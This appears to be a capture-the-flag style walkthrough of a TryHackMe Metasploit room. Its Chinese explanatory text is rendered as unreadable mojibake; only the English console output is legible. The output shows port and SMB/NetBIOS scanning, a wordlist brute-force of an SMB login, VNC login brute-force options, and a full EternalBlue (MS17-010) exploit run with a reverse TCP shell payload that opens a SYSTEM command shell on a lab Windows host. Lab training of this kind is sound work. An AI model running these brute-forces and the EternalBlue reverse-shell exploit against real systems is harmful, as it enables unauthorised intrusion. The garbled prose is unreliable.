2021-08-20 03:54 BST Nmap scan report for ip-10-10-12-229.eu-west-1.compute.internal (10.10.12.229) Host is up (0.0011s latency). Not shown: 992 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49158/tcp open unknown MAC Address: 02:CE:59:27:C8:E3 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 64.19 seconds msf6 &gt; è‡³äºä¿¡æ¯æ”¶é›†ï¼Œå¦‚æœæ‚¨çš„å‚ä¸éœ€è¦æ›´å¿«çš„ç«¯å£æ‰«ææ–¹æ³•ï¼ŒMetasploit å¯èƒ½ä¸æ˜¯æ‚¨çš„é¦–é€‰ã€‚ç„¶è€Œï¼Œè®¸å¤šæ¨¡å—ä½¿ Metasploit æˆä¸ºæ‰«æé˜¶æ®µçš„æœ‰ç”¨å·¥å…·ã€‚ UDP æœåŠ¡è¯†åˆ« scanner/discovery/udp_sweep æ¨¡å—å°†å…è®¸æ‚¨å¿«é€Ÿè¯†åˆ«é€šè¿‡ UDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰è¿è¡Œçš„æœåŠ¡ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œè¯¥æ¨¡å—ä¸ä¼šå¯¹æ‰€æœ‰å¯èƒ½çš„ UDP æœåŠ¡è¿›è¡Œå¹¿æ³›æ‰«æï¼Œä½†ç¡®å®æä¾›äº†ä¸€ç§å¿«é€Ÿæ–¹æ³•æ¥è¯†åˆ« DNS æˆ– NetBIOS ç­‰æœåŠ¡ã€‚ SMB æ‰«æ Metasploit æä¾›äº†å‡ ä¸ªæœ‰ç”¨çš„è¾…åŠ©æ¨¡å—ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿæ‰«æç‰¹å®šçš„æœåŠ¡ã€‚ä»¥ä¸‹æ˜¯ SMB çš„ç¤ºä¾‹ã€‚ smb_enumshares å’Œ smb_version åœ¨å…¬å¸ç½‘ç»œä¸­ç‰¹åˆ«æœ‰ç”¨ï¼Œä½†è¯·èŠ±ä¸€äº›æ—¶é—´æ¥è¯†åˆ«ç³»ç»Ÿä¸Šå®‰è£…çš„ Metasploit ç‰ˆæœ¬æä¾›çš„æ‰«æç¨‹åºã€‚ msf6 auxiliary(scanner/smb/smb_version) &gt; run [+] 10.10.12.229:445 - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional) [*] 10.10.12.229:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/smb/smb_version) &gt; æ‰§è¡ŒæœåŠ¡æ‰«ææ—¶ï¼Œé‡è¦çš„æ˜¯ä¸è¦å¿½ç•¥æ›´å¤šâ€œå¥‡å¼‚â€æœåŠ¡ï¼Œä¾‹å¦‚ NetBIOSã€‚ NetBIOSï¼ˆç½‘ç»œåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼‰ä¸SMBç±»ä¼¼ï¼Œå…è®¸è®¡ç®—æœºé€šè¿‡ç½‘ç»œè¿›è¡Œé€šä¿¡ä»¥å…±äº«æ–‡ä»¶æˆ–å°†æ–‡ä»¶å‘é€åˆ°æ‰“å°æœºã€‚ç›®æ ‡ç³»ç»Ÿçš„ NetBIOS åç§°å¯ä»¥è®©æ‚¨äº†è§£å…¶è§’è‰²ç”šè‡³é‡è¦æ€§ï¼ˆä¾‹å¦‚ CORP-DCã€DEVOPSã€SALES ç­‰ï¼‰ã€‚æ‚¨è¿˜å¯èƒ½ä¼šé‡åˆ°ä¸€äº›æ— éœ€å¯†ç å³å¯è®¿é—®æˆ–å—ç®€å•å¯†ç ä¿æŠ¤çš„å…±äº«æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼ˆä¾‹å¦‚ adminã€administratorã€rootã€toor ç­‰ï¼‰ã€‚ è¯·è®°ä½ï¼ŒMetasploit æœ‰è®¸å¤šæ¨¡å—å¯ä»¥å¸®åŠ©æ‚¨æ›´å¥½åœ°äº†è§£ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶å¯èƒ½å¸®åŠ©æ‚¨å‘ç°æ¼æ´ã€‚æ‰§è¡Œå¿«é€Ÿæœç´¢æ€»æ˜¯å€¼å¾—çš„ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰ä»»ä½•æ¨¡å—å¯ä»¥æ ¹æ®æ‚¨çš„ç›®æ ‡ç³»ç»Ÿæä¾›å¸®åŠ©ã€‚ ç›®æ ‡ç³»ç»Ÿä¸Šæ‰“å¼€äº†å¤šå°‘ä¸ªç«¯å£ï¼Ÿ ä½¿ç”¨ç›¸å…³æ‰«æä»ªï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ä»€ä¹ˆ NetBIOS åç§°ï¼Ÿ msf6 auxiliary(scanner/discovery/udp_sweep) &gt; use auxiliary/scanner/netbios/nbname msf6 auxiliary(scanner/netbios/nbname) &gt; options Module options (auxiliary/scanner/netbios/nbname): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/us ing-metasploit/basics/using-metasploit.html RPORT 137 yes The target port (UDP) THREADS 10 yes The number of concurrent threads View the full module info with the info, or info -d command. msf6 auxiliary(scanner/netbios/nbname) &gt; set rhosts 10.10.173.123 rhosts =&gt; 10.10.173.123 msf6 auxiliary(scanner/netbios/nbname) &gt; run [*] Sending NetBIOS requests to 10.10.173.123-&gt;10.10.173.123 (1 hosts) [+] 10.10.173.123 [IP-10-10-173-12] OS:Unix Names:(ACME IT SUPPORT, IP-10-10-173-12) Addresses:(10.10.173.123) Mac:00:00:00:00:00:00 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 8000ç«¯å£ä¸Šæ­£åœ¨è¿è¡Œä»€ä¹ˆï¼Ÿ msf6 auxiliary(scanner/http/http_version) &gt; info Name: HTTP Version Detection Module: auxiliary/scanner/http/http_version License: Metasploit Framework License (BSD) Rank: Normal Provided by: hdm &lt;x@hdm.io&gt; Check supported: No Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.173.123 yes The target host(s), see https://docs.metasploit.com/docs/using -metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads (max one per host) VHOST no HTTP server virtual host Description: Display version information about each system. View the full module info with the info -d command. msf6 auxiliary(scanner/http/http_version) &gt; set rport 8000 rport =&gt; 8000 msf6 auxiliary(scanner/http/http_version) &gt; set threads 15 threads =&gt; 15 msf6 auxiliary(scanner/http/http_version) &gt; run [+] 10.10.173.123:8000 webfs/1.21 ( 403-Forbidden ) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed â€œpennyâ€ç”¨æˆ·çš„ SMB å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿä½¿ç”¨ä¸Šä¸€ä¸ªä»»åŠ¡ä¸­æåˆ°çš„å•è¯è¡¨ã€‚ msf6 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10.10.173.123 rhosts =&gt; 10.10.173.123 msf6 auxiliary(scanner/smb/smb_login) &gt; set pass_file /usr/share/wordlists/metasploit/MetasploitWordlist.txt pass_file =&gt; /usr/share/wordlists/metasploit/MetasploitWordlist.txt msf6 auxiliary(scanner/smb/smb_login) &gt; set threads 15 threads =&gt; 15 msf6 auxiliary(scanner/smb/smb_login) &gt; set SMBUser SMBUser =&gt; msf6 auxiliary(scanner/smb/smb_login) &gt; set SMBUser penny SMBUser =&gt; penny msf6 auxiliary(scanner/smb/smb_login) &gt; run 0x03 Metasploit æ•°æ®åº“ è™½ç„¶åœ¨ TryHackMe ä¸Šä¸å•ä¸ªç›®æ ‡äº¤äº’æ—¶ä¸éœ€è¦è¿™æ ·åšï¼Œä½†å®é™…çš„æ¸—é€æµ‹è¯•æ´»åŠ¨å¯èƒ½ä¼šæœ‰å¤šä¸ªç›®æ ‡ã€‚ Metasploit å…·æœ‰æ•°æ®åº“åŠŸèƒ½ï¼Œå¯ä»¥ç®€åŒ–é¡¹ç›®ç®¡ç†å¹¶é¿å…è®¾ç½®å‚æ•°å€¼æ—¶å¯èƒ½å‡ºç°çš„æ··ä¹±ã€‚ æ‚¨é¦–å…ˆéœ€è¦å¯åŠ¨ PostgreSQL æ•°æ®åº“ï¼ŒMetasploit å°†é€šè¿‡ä»¥ä¸‹å‘½ä»¤ä½¿ç”¨è¯¥æ•°æ®åº“ï¼š systemctl start postgresql ç„¶åæ‚¨éœ€è¦ä½¿ç”¨ msfdb init å‘½ä»¤åˆå§‹åŒ– Metasploit æ•°æ®åº“ã€‚ â”Œâ”€â”€(rootã‰¿kali)-[/home/hybcx] â””â”€# systemctl start postgresql.service â”Œâ”€â”€(rootã‰¿kali)-[/home/hybcx] â””â”€# msfdb init [i] Database already started [+] Creating database user 'msf' ä¸ºæ–°è§’è‰²è¾“å…¥çš„å£ä»¤: å†è¾“å…¥ä¸€é: [+] Creating databases 'msf' [+] Creating databases 'msf_test' [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml' [+] Creating initial database schema æ‚¨ç°åœ¨å¯ä»¥å¯åŠ¨msfconsole å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æ•°æ®åº“çŠ¶æ€db_status command. å‘½ä»¤ã€‚ msf6 &gt; db_status [*] Connected to msf. Connection type: postgresql. msf6 &gt; æ•°æ®åº“åŠŸèƒ½å°†å…è®¸æ‚¨åˆ›å»ºå·¥ä½œåŒºæ¥éš”ç¦»ä¸åŒçš„é¡¹ç›®ã€‚é¦–æ¬¡å¯åŠ¨æ—¶ï¼Œæ‚¨åº”è¯¥ä½äºé»˜è®¤å·¥ä½œåŒºä¸­ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤åˆ—å‡ºå¯ç”¨çš„å·¥ä½œåŒº msf6 &gt; workspace * default msf6 &gt; æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ·»åŠ å·¥ä½œåŒº-a å‚æ•°æˆ–ä½¿ç”¨åˆ é™¤å·¥ä½œåŒº-då‚æ•°ï¼Œåˆ†åˆ«ã€‚ä¸‹é¢çš„å±å¹•æˆªå›¾æ˜¾ç¤ºåˆ›å»ºäº†ä¸€ä¸ªä¸ºâ€œtryhackmeâ€çš„æ–°å·¥ä½œåŒºã€‚ æ‚¨è¿˜ä¼šæ³¨æ„åˆ°æ–°çš„æ•°æ®åº“åç§°ä»¥çº¢è‰²æ‰“å°ï¼Œä»¥* symbol. è±¡å¾ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨å·¥ä½œåŒºå‘½ä»¤åœ¨å·¥ä½œåŒºä¹‹é—´å¯¼èˆªï¼Œåªéœ€é”®å…¥workspace åè·Ÿæ‰€éœ€çš„å·¥ä½œåŒºåç§°ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨workspace -h å‘½ä»¤åˆ—å‡ºå¯ç”¨é€‰é¡¹workspace command. å‘½ä»¤ã€‚ ä¸å¸¸è§„ Metasploit ä½¿ç”¨ä¸åŒï¼Œä¸€æ—¦ä½¿ç”¨æ•°æ®åº“å¯åŠ¨ Metasploitï¼Œhelp å‘½ä»¤ï¼Œæ‚¨å°†æ˜¾ç¤ºæ•°æ®åº“åç«¯å‘½ä»¤èœå•ã€‚ å¦‚æœæ‚¨ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œ Nmap æ‰«ædb_nmap å¦‚ä¸‹æ‰€ç¤ºï¼Œæ‰€æœ‰ç»“æœå°†ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚ db_nmap -sV -p- 10.10.173.123 æ‚¨ç°åœ¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–ä¸ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œçš„ä¸»æœºå’ŒæœåŠ¡ç›¸å…³çš„ä¿¡æ¯hosts and å’Œservices å‘½ä»¤ã€‚ å‘½ä»¤å¯ä»¥å¸®åŠ©æ‚¨æ›´åŠ ç†Ÿæ‚‰å¯ç”¨çš„é€‰é¡¹ã€‚ ä¸€æ—¦ä¸»æœºä¿¡æ¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ‚¨å°±å¯ä»¥ä½¿ç”¨ hosts -Rå‘½ä»¤å°†æ­¤å€¼æ·»åŠ åˆ° RHOSTS å‚æ•°ã€‚ ç¤ºä¾‹å·¥ä½œæµç¨‹ æˆ‘ä»¬å°†ä½¿ç”¨æ¼æ´æ‰«ææ¨¡å—ï¼Œé€šè¿‡ use auxiliary/scanner/smb/smb_ms17_010 å‘½ä»¤æŸ¥æ‰¾æ½œåœ¨çš„ MS17-010 æ¼æ´ã€‚ æˆ‘ä»¬ä½¿ç”¨ hosts -R è®¾ç½® ROSTS å€¼. æˆ‘ä»¬è¾“å…¥ show options æ¥æ£€æŸ¥æ‰€æœ‰å€¼æ˜¯å¦éƒ½å·²æ­£ç¡®åˆ†é…ã€‚ ï¼ˆåœ¨æœ¬ä¾‹ä¸­ï¼Œ10.10.138.32æ˜¯æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨ db_nmap å‘½ä»¤æ‰«æåˆ°çš„IPåœ°å€ï¼‰ è®¾ç½®å®Œæ‰€æœ‰å‚æ•°åï¼Œæˆ‘ä»¬ä½¿ç”¨ run æˆ– exploit å‘½ä»¤å¯åŠ¨æ¼æ´åˆ©ç”¨ã€‚ å¦‚æœæ•°æ®åº“ä¸­ä¿å­˜äº†å¤šäºä¸€å°ä¸»æœºï¼Œåˆ™åœ¨é…ç½®æ—¶å°†ä½¿ç”¨æ‰€æœ‰ IP åœ°å€ã€‚hosts -R å‘½ä»¤ã€‚ åœ¨å…¸å‹çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°ä»¥ä¸‹åœºæ™¯ï¼š ä½¿ç”¨ db_nmap å‘½ä»¤æŸ¥æ‰¾å¯ç”¨ä¸»æœº æ‰«æè¿™äº›æ˜¯å¦æœ‰æ›´å¤šæ¼æ´æˆ–å¼€æ”¾ç«¯å£ï¼ˆä½¿ç”¨ç«¯å£æ‰«ææ¨¡å—ï¼‰ ä¸ -S å‚æ•°ä¸€èµ·ä½¿ç”¨çš„ services å‘½ä»¤å°†å…è®¸æ‚¨æœç´¢ç¯å¢ƒä¸­çš„ç‰¹å®šæœåŠ¡ã€‚ msf6 &gt; services -S netbios Services ======== host port proto name state info ---- ---- ----- ---- ----- ---- 10.10.12.229 139 tcp netbios-ssn open Microsoft Windows netbios-ssn æ‚¨å¯èƒ½æƒ³è¦å¯»æ‰¾å®¹æ˜“å®ç°çš„ç›®æ ‡ï¼Œä¾‹å¦‚ï¼š HTTPï¼šå¯èƒ½ä¼šæ‰˜ç®¡ä¸€ä¸ª Web åº”ç”¨ç¨‹åºï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ° SQL æ³¨å…¥æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) ç­‰æ¼æ´ã€‚ FTPï¼šå¯ä»¥å…è®¸åŒ¿åç™»å½•å¹¶æä¾›å¯¹æœ‰è¶£æ–‡ä»¶çš„è®¿é—®ã€‚ SMBï¼šå¯èƒ½å®¹æ˜“å—åˆ° MS17-010 ç­‰ SMB æ¼æ´çš„æ”»å‡» SSHï¼šå¯èƒ½æœ‰é»˜è®¤æˆ–å®¹æ˜“çŒœæµ‹çš„å‡­æ® RDPï¼šå¦‚æœä½¿ç”¨å¼±å‡­æ®ï¼Œå¯èƒ½å®¹æ˜“å—åˆ° Bluekeep çš„æ”»å‡»æˆ–å…è®¸æ¡Œé¢è®¿é—®ã€‚ æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼ŒMetasploit å…·æœ‰è®¸å¤šæœ‰åŠ©äºå‚ä¸çš„åŠŸèƒ½ï¼Œä¾‹å¦‚èƒ½å¤Ÿå°†æ‚¨çš„å‚ä¸åˆ’åˆ†åˆ°å·¥ä½œåŒºã€é«˜çº§åˆ†æç»“æœä»¥åŠå¿«é€Ÿå¯¼å…¥å’Œæ¢ç´¢æ•°æ®ã€‚ 0x04 æ¼æ´æ‰«æ Metasploit å…è®¸æ‚¨å¿«é€Ÿè¯†åˆ«ä¸€äº›å¯è¢«è§†ä¸ºâ€œå®¹æ˜“å®ç°çš„ç›®æ ‡â€çš„å…³é”®æ¼æ´ã€‚æœ¯è¯­â€œå”¾æ‰‹å¯å¾—çš„æœå®â€é€šå¸¸æŒ‡çš„æ˜¯æ˜“äºè¯†åˆ«å’Œåˆ©ç”¨çš„æ¼æ´ï¼Œè¿™äº›æ¼æ´å¯èƒ½ä¼šè®©æ‚¨åœ¨ç³»ç»Ÿä¸Šè·å¾—ç«‹è¶³ç‚¹ï¼Œå¹¶åœ¨æŸäº›æƒ…å†µä¸‹è·å¾—é«˜çº§æƒé™ï¼Œä¾‹å¦‚ root æˆ–ç®¡ç†å‘˜æƒé™ã€‚ ä½¿ç”¨ Metasploit æŸ¥æ‰¾æ¼æ´åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºæ‚¨å¯¹ç›®æ ‡è¿›è¡Œæ‰«æå’ŒæŒ‡çº¹è¯†åˆ«çš„èƒ½åŠ›ã€‚æ‚¨åœ¨è¿™äº›é˜¶æ®µåšå¾—è¶Šå¥½ï¼ŒMetasploit å¯ä»¥ä¸ºæ‚¨æä¾›çš„é€‰æ‹©å°±è¶Šå¤šã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨è¯†åˆ«å‡ºç›®æ ‡ä¸Šè¿è¡Œçš„ VNC æœåŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Metasploit ä¸Šçš„ search åŠŸèƒ½æ¥åˆ—å‡ºæœ‰ç”¨çš„æ¨¡å—ã€‚ç»“æœå°†åŒ…å«æœ‰æ•ˆè´Ÿè½½å’Œå¸–å­æ¨¡å—ã€‚åœ¨ç°é˜¶æ®µï¼Œè¿™äº›ç»“æœå¹¶ä¸æ˜¯å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰å‘ç°å¯ä»¥ä½¿ç”¨çš„æ½œåœ¨æ¼æ´ã€‚ä½†æ˜¯ï¼Œå¯¹äº VNCï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªæ‰«æä»ªæ¨¡å—ã€‚ msf6 &gt; use auxiliary/scanner/vnc/ use auxiliary/scanner/vnc/ard_root_pw use auxiliary/scanner/vnc/vnc_login use auxiliary/scanner/vnc/vnc_none_auth msf6 &gt; use auxiliary/scanner/vnc/ æ‚¨å¯ä»¥å¯¹ä»»ä½•æ¨¡å—ä½¿ç”¨ info å‘½ä»¤ï¼Œä»¥æ›´å¥½åœ°äº†è§£å…¶ç”¨é€”å’Œç”¨é€”ã€‚ msf6 auxiliary(scanner/vnc/vnc_login) &gt; info Name: VNC Authentication Scanner Module: auxiliary/scanner/vnc/vnc_login License: Metasploit Framework License (BSD) Rank: Normal Provided by: carstein jduck Check supported: No Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no The password to test PASS_FILE /opt/metasploit-framework-5101/data/wordlists/vnc_passwords.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 5900 yes The target port (TCP) STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE no File containing usernames, one per line VERBOSE true yes Whether to print output for all attempts Description: This module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method. References: https://cvedetails.com/cve/CVE-1999-0506/ msf6 auxiliary(scanner/vnc/vnc_login) &gt; æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œ vnc_login æ¨¡å—å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°VNCæœåŠ¡çš„ç™»å½•è¯¦ç»†ä¿¡æ¯ã€‚ è°ç¼–å†™äº†å…è®¸æˆ‘ä»¬æ£€æŸ¥ SMTP æœåŠ¡å™¨çš„å¼€æ”¾ä¸­ç»§çš„æ¨¡å—ï¼Ÿ 0x05 åˆ©ç”¨/å¼€å‘ é¡¾åæ€ä¹‰ï¼ŒMetasploit æ˜¯ä¸€ä¸ªå¼€å‘æ¡†æ¶ã€‚æ¼æ´åˆ©ç”¨æ˜¯æœ€å¸¸è§çš„æ¨¡å—ç±»åˆ«ã€‚ =[ metasploit v5.0.101-dev] + -- --=[ 2048 exploits - 1105 auxiliary - 344 post] + -- --=[ 562 payloads - 45 encoders - 10 nops] + -- --=[ 7 evasion] æ‚¨å¯ä»¥ä½¿ç”¨ search å‘½ä»¤æœç´¢æ¼æ´åˆ©ç”¨ç¨‹åºï¼Œä½¿ç”¨ info å‘½ä»¤è·å–æœ‰å…³æ¼æ´åˆ©ç”¨ç¨‹åºçš„æ›´å¤šä¿¡æ¯ï¼Œå¹¶ä½¿ç”¨ exploit å¯åŠ¨æ¼æ´åˆ©ç”¨ç¨‹åºã€‚è™½ç„¶è¿‡ç¨‹æœ¬èº«å¾ˆç®€å•ï¼Œä½†è¯·è®°ä½ï¼ŒæˆåŠŸçš„ç»“æœå–å†³äºå¯¹ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œçš„æœåŠ¡çš„é€å½»ç†è§£ã€‚ å¤§å¤šæ•°æ¼æ´åˆ©ç”¨éƒ½ä¼šæœ‰é¢„è®¾çš„é»˜è®¤è´Ÿè½½ã€‚ä½†æ˜¯ï¼Œæ‚¨å§‹ç»ˆå¯ä»¥ä½¿ç”¨ show payloads å‘½ä»¤åˆ—å‡ºå¯ç”¨äºè¯¥ç‰¹å®šæ¼æ´çš„å…¶ä»–å‘½ä»¤ã€‚ ä¸€æ—¦æ‚¨å†³å®šäº†æœ‰æ•ˆè´Ÿè½½ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ set payload å‘½ä»¤è¿›è¡Œé€‰æ‹©ã€‚ msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 2 payload =&gt; generic/shell_reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; è¯·æ³¨æ„ï¼Œç”±äºç¯å¢ƒæˆ–æ“ä½œç³»ç»Ÿé™åˆ¶ï¼ˆä¾‹å¦‚é˜²ç«å¢™è§„åˆ™ã€é˜²ç—…æ¯’ã€æ–‡ä»¶å†™å…¥ï¼‰æˆ–æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½çš„ç¨‹åºä¸å¯ç”¨ï¼ˆä¾‹å¦‚ï¼Œpayload/python/shell_reverse_tcpï¼‰ï¼Œé€‰æ‹©å·¥ä½œæœ‰æ•ˆè´Ÿè½½å¯èƒ½ä¼šæˆä¸ºä¸€ä¸ªåå¤è¯•éªŒçš„è¿‡ç¨‹ï¼‰ã€‚ æŸäº›æœ‰æ•ˆè´Ÿè½½å°†æ‰“å¼€æ‚¨å¯èƒ½éœ€è¦è®¾ç½®çš„æ–°å‚æ•°ï¼Œå†æ¬¡è¿è¡Œ show options å‘½ä»¤å¯ä»¥æ˜¾ç¤ºè¿™äº›å‚æ•°ã€‚æ­£å¦‚æ‚¨åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­æ‰€çœ‹åˆ°çš„ï¼Œåå‘è´Ÿè½½è‡³å°‘éœ€è¦æ‚¨è®¾ç½® LHOST é€‰é¡¹ã€‚ msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.10.186.44 lhost =&gt; 10.10.186.44 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit [*] Started reverse TCP handler on 10.10.186.44:4444 [*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.12.229:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.12.229:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.12.229:445 - Connecting to target for exploitation. [+] 10.10.12.229:445 - Connection established for exploitation. [+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes) [*] 10.10.12.229:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.12.229:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.12.229:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.12.229:445 - Sending all but last fragment of exploit packet [*] 10.10.12.229:445 - Starting non-paged pool grooming [+] 10.10.12.229:445 - Sending SMBv2 buffers [+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.12.229:445 - Sending final SMBv2 buffers. [*] 10.10.12.229:445 - Sending last fragment of exploit packet! [*] 10.10.12.229:445 - Receiving response from exploit packet [+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.12.229:445 - Sending egg to corrupted connection. [*] 10.10.12.229:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.10.186.44:4444 -&gt; 10.10.12.229:49366) at 2021-08-20 04:51:19 +0100 C:\\Windows\\system32&gt; æ‰“å¼€ä¼šè¯åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ CTRL+Z å°†å…¶ç½®äºåå°ï¼Œæˆ–ä½¿ç”¨ CTRL+C å°†å…¶ä¸­æ­¢ã€‚å½“åŒæ—¶å¤„ç†å¤šä¸ªç›®æ ‡æˆ–ä½¿ç”¨ä¸åŒçš„æ¼æ´åˆ©ç”¨å’Œ/æˆ– shell å¤„ç†åŒä¸€ç›®æ ‡æ—¶ï¼Œåå°ä¼šè¯å°†éå¸¸æœ‰ç”¨ã€‚ C:\\Windows\\system32&gt;^Z Background session 1? [y/N] y msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.10.186.44:4444 -&gt; 10.10.12.229:49366 (10.10.12.229) msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; ä½¿ç”¨ä¼šè¯ sessions å‘½ä»¤å°†åˆ—å‡ºæ‰€æœ‰æ´»åŠ¨ä¼šè¯ã€‚ sessions å‘½ä»¤æ”¯æŒè®¸å¤šé€‰é¡¹ï¼Œå¯å¸®åŠ©æ‚¨æ›´å¥½åœ°ç®¡ç†ä¼šè¯ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ sessions -i å‘½ä»¤åè·Ÿä¼šè¯ ID ä¸ä»»ä½•ç°æœ‰ä¼šè¯è¿›è¡Œäº¤äº’ã€‚ msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.10.186.44:4444 -&gt; 10.10.12.229:49366 (10.10.12.229) msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1 [*] Starting interaction with 1... C:\\Windows\\system32&gt; éƒ¨ç½²ç›®æ ‡æœºå™¨å¹¶å›ç­”ä»¥ä¸‹é—®é¢˜ï¼š è¿™é‡Œå…ˆç”¨db_nmapæ‰«æé¶æœº å‘ç°445ç«¯å£ï¼Œçœ‹äº†æ–‡ç« å°è¯•åˆ©ç”¨æ°¸æ’ä¹‹è“ 